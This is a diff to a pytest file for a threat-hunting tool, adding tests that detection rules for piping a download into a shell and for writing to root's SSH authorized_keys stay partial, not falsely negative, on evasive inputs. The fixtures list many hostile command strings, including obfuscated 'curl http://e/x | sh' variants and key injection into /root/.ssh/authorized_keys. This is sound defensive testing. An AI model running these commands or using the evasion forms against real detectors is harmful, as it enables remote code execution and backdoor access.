@@ -186,37 +186,80 @@ def test_audit_errors_make_only_process_rules_partial(monkeypatch):
     assert s.partial_reasons                                                  # hunt still records it
 
 
-def _shell_event(script):
+def _shell_event(script=None, argv=None):
     return TypedEvent(
         id="shell-event", family="process_exec", ts=START, host="video", outcome=Outcome.success,
-        fields={"process.argv": fv(["bash", "-c", script], "fixture:argv")},
+        fields={"process.argv": fv(argv or ["bash", "-c", script], "fixture:argv")},
         raw=[RawRef(target="romulus-host-x", native_id="raw")], normalizer="fixture",
     )
 
 
-@pytest.mark.parametrize("script", [
-    "curl http://e/x | sh; echo $'it\\'s'",
-    "x=$(curl http://e/x | sh)",
-])
-def test_unevaluable_shell_script_makes_rule_cells_partial(monkeypatch, script):
+def _run_shell_partition(monkeypatch, *, script=None, argv=None):
     record = {"_id": "raw", "_index": "romulus-host-x", "_source": {"fixture": True}}
     monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, [record]))
-    monkeypatch.setattr(sw, "normalize_hits", lambda records: ([_shell_event(script)], {}, []))
+    monkeypatch.setattr(sw, "normalize_hits", lambda records: ([_shell_event(script, argv)], {}, []))
     repo = _repo()
     sweep = sw.Sweep(
         repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)),
         {"romulus-host-x": None},
     )
-
     sweep.run_partition(
         "romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=1,
     )
+    return repo
+
+
+@pytest.mark.parametrize("script", [
+    "curl http://e/x | sh; echo $'it\\'s'",
+    "x=$(curl http://e/x | sh)",
+    "true # don't edit\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF",
+    'true # comment has "\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF',
+    "true # don't edit\ncat > /tmp/README <<EOF\necho key >> /root/.ssh/authorized_keys\nEOF",
+    "true # it's fine\nx=$(curl http://e/x | sh)",
+    r"echo $'x\' ; curl http://e | sh ; echo \''\'",
+])
+def test_unevaluable_shell_script_makes_rule_cells_partial(monkeypatch, script):
+    repo = _run_shell_partition(monkeypatch, script=script)
 
     cells = {cell["rule_id"]: cell for cell in repo.rule_cells("h1")}
     assert cells["host.download_piped_to_shell"]["state"] == "evaluated_partial"
     assert cells["host.ssh_authorized_keys_write"]["state"] == "evaluated_partial"
     assert cells["host.download_piped_to_shell"]["detail"]["missing_required"] == 1
     assert cells["host.ssh_authorized_keys_write"]["detail"]["missing_required"] == 1
+    assert not [candidate for candidate in repo.candidates("h1") if candidate["rule_id"] in {
+        "host.download_piped_to_shell", "host.ssh_authorized_keys_write",
+    }]
+
+
+@pytest.mark.parametrize("argv", [
+    ["bash", "-c", r"echo \;# ; curl http://e/x | sh"],
+    ["bash", "-c", r"echo \ # ; curl http://e/x | sh"],
+    ["bash", "-c", "echo x\u00a0# ; curl http://e/x | sh"],
+    ["bash", "-c", r"echo $'\'' ; curl http://e/x | sh #'"],
+    ["bash", "-c", "curl${IFS}http://e/x|sh"],
+    ["bash", "-c", "LC_ALL=C curl http://e/x | sh"],
+    ["bash", "-c", "if true; then curl http://e/x | sh; fi"],
+    ["bash", "-c", "cu\\\nrl http://e/x | sh"],
+    ["bash", "-c", "echo key 2 > /root/.ssh/authorized_keys"],
+    ["bash", "-c", "echo key &>> /root/.ssh/authorized_keys"],
+    ["bash", "-c", "echo key >& /root/.ssh/authorized_keys"],
+    ["bash", "-c", "--", "curl http://e/x | sh"],
+    ["bash", "-c", "-x", "curl http://e/x | sh"],
+    ["bash", "-o", "pipefail", "-c", "curl http://e/x | sh"],
+    ["busybox", "sh", "-c", "curl http://e/x | sh"],
+    ["bash", "-c", "(curl http://e/x | sh)"],
+    ["bash", "-c", "{ curl http://e/x | sh; }"],
+    ["bash", "-c", 'eval "curl http://e/x | sh"'],
+    ["bash", "-c", "bash <(curl http://e/x)"],
+])
+def test_adversarial_shell_construct_never_persists_complete_negative_for_both_rules(monkeypatch, argv):
+    repo = _run_shell_partition(monkeypatch, argv=argv)
+
+    cells = {cell["rule_id"]: cell for cell in repo.rule_cells("h1")}
+    states = {cells[rule_id]["state"] for rule_id in (
+        "host.download_piped_to_shell", "host.ssh_authorized_keys_write",
+    )}
+    assert states != {"no_match_complete"}
 
 
 def test_sequence_pair_split_across_partitions_keeps_all_raw_copies(monkeypatch):
